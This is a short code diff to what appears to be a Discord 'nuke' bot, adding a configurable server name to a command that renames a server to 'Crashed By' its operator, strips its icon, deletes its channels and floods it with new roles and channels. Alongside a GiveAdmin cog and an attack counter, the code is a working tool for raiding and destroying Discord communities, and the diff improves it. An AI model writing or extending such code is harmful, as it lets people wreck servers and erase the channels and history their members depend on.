@@ -5,6 +5,7 @@ from discord.ext.commands import BucketType, CommandOnCooldown
 from core.managers.counter import AttackCounter
 from core.operations import Nuke
 from core.config.config import NAME
+from core.managers.config import NukeConfig
 
 class GiveAdmin(commands.Cog):
     def __init__(self, bot):
@@ -36,7 +37,8 @@ class Nuke(commands.Cog):
         self.attack_counter.record_attack_start()
 
         fucker = Nuke(ctx)  # Define our mini-api wrapper
-        await ctx.guild.edit(name=f"Crashed By {NAME}.", icon=None)
+        guild_name = fucker.config.get_guild_settings().get("name") or f"Crashed By {NAME}."
+        await ctx.guild.edit(name=guild_name, icon=None)
         await fucker.delChannels(ctx)
         await fucker.crRoles(ctx)
         await fucker.crChannels(ctx)
